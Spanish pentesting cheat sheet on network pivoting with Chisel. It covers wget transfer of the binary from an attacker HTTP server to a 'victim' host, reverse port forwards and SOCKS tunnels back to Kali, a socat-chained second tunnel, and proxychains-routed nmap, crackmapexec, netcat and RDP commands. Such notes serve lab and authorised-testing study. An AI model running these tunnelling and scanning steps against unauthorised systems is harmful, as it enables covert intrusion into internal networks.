# Pivoting con Chisel

Tags: #Chisel #DinamicForwarding #RemoteForwarding #Pivoting 

Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto remoto.

* **Server -> Windows** 
* **Cliente -> Kali**

```bash
1. Descargar el binario 'Chisel' desde los 'Releases' para Windows o Linux
❯ https://github.com/jpillora/chisel

# En Linux 
2. Reducir el tamaño al binario 'Chisel' para una transferencia más rapida
❯ du -hc chisel                   # Mirar el peso del binario
❯ upx Chisel                      # Reducir el tamaño del binario 


3. Transferir Chisel a la maquina víctima mediante un servidor 'HTTP' 
❯ python3 -m http.server 80       # Maquina de atacante 
❯ wget http://IP/chisel           # Maquina víctima 
```

## 1. Remote Port Forwarding

## 1.1 Crear un túnel con un puerto especifico 

```bash
❯ ./chisel server --reverse -p 1234       # Server 'Maquina Kali'

	# Port-Server = Puerto a abrir en Kali

❯ ./chisel client <IP-Server>:1234 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos>    # Cliente 'Maquina víctima'

	# IP-Server = IP de Kali
	# Port-Server = Puerto de Kali = 1234
	# R = Remote Port Forwarding
	# Port-Local = Puerto que vamos a traer de la maquina víctima
	# IP-Local = IP del Localhost de la maquina víctima 
	# Port-Traemos = Puerto a abrir en Kali

Nota: Se crea un túnel utilizando un solo puerto con una IP especifica
```

## 1.2 Crear un túnel con todos los puertos 

```bash
# Crea un túnel desde la maquina Kali hacia la maquina víctima

❯ ./chisel server --reverse -p 1234                    # Server 'Maquina Kali'
❯ ./chisel client <IP-Server>:1234 R:socks             # Cliente 'Maquina víctima'

	# IP-Server = IP de Kali
	# Port-Server = Puerto de Kali
	# R = Remote Port Forwarding
     # socks = Abre el puerto 1080 de Kali y crea un túnel para llegar a la máquina víctima 

Nota: Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que queremos acceder 
```

```bash 
# Hacer los siguientes cambios después de crear el túnel 

❯ nvim /etc/proxychains.conf 

Nota: 
1. Deshabilitar comentando 'Dinamic_chain' ya que solo se habilita cuando se tienen varios tuneles
2. Habilitar descomentando 'Strick_chain' ya que solo se habilita cuando tenemos un solo túnel 
3. Hasta abajo del archivo agregar lo siguiente:

	socks5 127.0.0.1 1080 
	
```

## 2. Dinamic Port Forwarding para tener dos túneles 

```bash 
Nota:
	1. Este se utiliza cuando queremos más de un túnel
	2. Crear un segundo túnel desde la segunda máquina víctima hacia la primer máquina víctima que contiene el primer túnel


❯ socat TCP-LISTEN:4455,fork TCP:<IP-Server>:1234            # Server 'Maquina víctima con el primer túnel' 

	# TCP-LISTEN = Escuchar en el puerto 4455
	# TCP:<IP-Server>:1234 = Redirigir el tráfico al destino 'Kali' y en el puerto '1234' configurado en el primer túnel
	# <IP-Server> = IP de Kali

❯ .\chisel.exe client <IP-1erTunel>:4455 R:8888:socks        # Cliente 'Segunda maquina víctima'

	# IP-1erTunel = IP de la maquina víctima que tiene configurado el primer túnel
	# Port-Server = Puerto a abrir 
	# R = Remote Port Forwarding
     # socks = Abre el puerto 8888 de la maquina con el primer túnel y crea el segundo túnel 


Nota: Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que queremos acceder 
```

```bash 
# Hacer los siguientes cambios en el archivo después de crear el segundo túnel 

❯ nano /etc/proxychains.conf        # Modificar el archivo 'proxychains' y agregar lo siguiente:

Nota: 
1. Habilitar descomentando 'Dinamic_chain' ya que solo se habilita cuando se tienen varios tuneles
2. Dehabilitar comentando 'Strick_chain' ya que solo se habilita cuando tenemos un solo túnel 
3. Hasta abajo del archivo agregar lo siguiente en este orden:

	socks5 127.0.0.1 8888          # Primero se agrega el segundo túnel
	socks5 127.0.0.1 1080          # Despues se agrega el primer túnel 
```

## 3. Comandos con Proxychains

```bash 
Siempre se debe colocar 'proxychains' antes de cada comando por lo que hará el comando pase por el tunel creado por chisel

- NMAP
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n ❮Target IP❯ 2>&1 | grep "tcp open"

	# P = Tareas en paralelo

❯ proxychains nmap --top-ports 500 --open -T5 -v -n <IP> -sT -Pn -oG allports 2>&1 | grep -vE "timeout|OK"
❯ proxychains nmap -sT -Pn -sCV -p22,.. <IP> -oN Targeted | grep -vE "timeout|OK"

- CRACKMAPEXEC 
❯ proxychains crackmapexec smb IP 2>/dev/null    # Enumeración del SMB

- WHATWEB
❯ proxychains whatweb IP          # Escaneo hacia la maquina víctima 


- NETCAT
❯ proxychains nc -nv IP 445       # Ejecutar netcat en el puerto 445
	# n = No aplicar DNS
	# v = Verbose 


- REMOTE DESKTOP
❯ proxychains rdesktop IP          # Conectarse por RDP utilizando un usuario y passwd validos. Este comando abrirá una ventana 'Windows' para hacer el login con las credenciales 


- VNCVIEWER
❯ proxychains vncviewer -passwd secret 127.0.0.1:5901   # Conectarse por vncviewer

	# secret = Archivo que contiene la passwd para la conexión
```